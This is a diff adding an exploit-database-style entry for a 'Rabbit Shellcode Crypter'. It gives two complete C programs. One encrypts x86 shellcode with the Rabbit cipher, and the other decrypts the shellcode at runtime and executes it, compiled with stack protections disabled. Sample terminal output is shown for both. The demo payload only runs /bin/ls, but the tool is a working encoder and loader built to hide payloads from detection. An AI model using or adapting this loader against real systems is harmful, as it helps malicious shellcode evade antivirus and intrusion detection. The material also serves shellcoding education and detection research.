@@ -1,0 +1,109 @@
+################################################################################
+# Introduction
+################################################################################
+#
+# Exploit Title: Rabbit Shellcode Crypter
+# Date: 24.4.2019
+# Exploit Author: Petr Javorik, www.mmquant.net
+# Tested on: Linux ubuntu 3.13.0-32-generic, x86
+# Description: Crypter which encrypts, decrypts and executes given shellcode
+# using Rabbit symmetric cipher
+#
+################################################################################
+# Keep in mind before use
+################################################################################
+#
+# 1. Max shellcode length 200 bytes (easily adjustable)
+# 2. You will probably have to adjust #include rabbit.c directive
+# 3. Encryption key is strictly 16 bytes
+#
+################################################################################
+# How to use
+################################################################################
+#
+# 1. Download ECRYPT rabbit library http://www.ecrypt.eu.org/stream/e2-rabbit.html
+# 2. Compile/Run $ gcc encrypt2rabbit.c -o encrypt2rabbit
+# 3. Copy encrypted shellcode to decryptAndExecute.c
+# 4. Compile $ gcc -fno-stack-protector -z execstack decryptAndExecute.c -o decryptAndExecute
+# 5. Run with encryption key $ ./decryptAndExecute someencryptkeyyy
+#
+################################################################################
+# Encryption
+################################################################################
+
+// File: encrypt2rabbit.c
+// Author: Petr Javorik
+
+#include <string.h>
+#include <stdio.h>
+#include "../rabbit/code/rabbit.c"
+
+// execve /bin/ls
+unsigned char code[] = \
+"\x31\xc0\x50\x68\x2f\x2f\x6c\x73\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";
+char key[16] = {'s', 'o', 'm', 'e', 'e', 'n', 'c', 'r', 'y', 'p', 't', 'k', 'e', 'y', 'y', 'y'};
+
+
+int main()
+{
+    ECRYPT_init();
+    ECRYPT_ctx ctx;
+    ECRYPT_keysetup(&ctx, key, 128, 0);
+    u8 encrypted[200];
+    int codeLen = strlen(code);
+    ECRYPT_process_bytes(0, &ctx, code, encrypted, codeLen);
+
+    int i;
+    printf("Encryption Key = ");
+    for (i=0; i<16; i++)
+        printf("%c", key[i]);
+    printf("\n");
+
+    printf("Original       = ");
+    for (i=0; i<codeLen; i++)
+        printf("\\x%02x", code[i]);
+    printf("\n");
+
+    printf("Encrypted      = ");
+    for (i=0; i<codeLen; i++)
+        printf("\\x%02x", encrypted[i]);
+    printf ("\n");
+
+    return 0;
+}
+######################################
+$ ./encrypt2rabbit 
+Encryption Key = someencryptkeyyy
+Original       = \x31\xc0\x50\x68\x2f\x2f\x6c\x73\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
+Encrypted      = \x7f\xaf\xa4\x1e\xb7\x11\x01\x92\xd5\x56\x95\x03\x7a\x4b\x07\x0b\x94\xf8\xd4\x86\x3d\xbc\x4c\xa3\x30
+
+################################################################################
+# Decryption/Execution
+################################################################################
+
+// File: decryptAndExecute.c
+// Author: Petr Javorik
+
+#include <string.h>
+#include <stdio.h>
+#include "../rabbit/code/rabbit.c"
+
+unsigned char encrypted[] = \
+"\x7f\xaf\xa4\x1e\xb7\x11\x01\x92\xd5\x56\x95\x03\x7a\x4b\x07\x0b\x94\xf8\xd4\x86\x3d\xbc\x4c\xa3\x30";
+
+int main(int argc, char **argv)
+{
+    ECRYPT_init();
+    ECRYPT_ctx ctx;
+    ECRYPT_keysetup(&ctx, argv[1], 128, 0);
+    u8 decrypted[200];
+    int codeLen = strlen(encrypted);
+    ECRYPT_process_bytes(0, &ctx, encrypted, decrypted, codeLen);
+
+    int (*DecryptedFun)() = (int(*)())decrypted;
+    DecryptedFun();
+}
+
+######################################
+$ ./decryptAndExecute someencryptkeyyy
+decryptAndExecute  decryptAndExecute.c  encrypt2rabbit  encrypt2rabbit.c  execve-stack  execve-stack.nasm  execve-stack.o
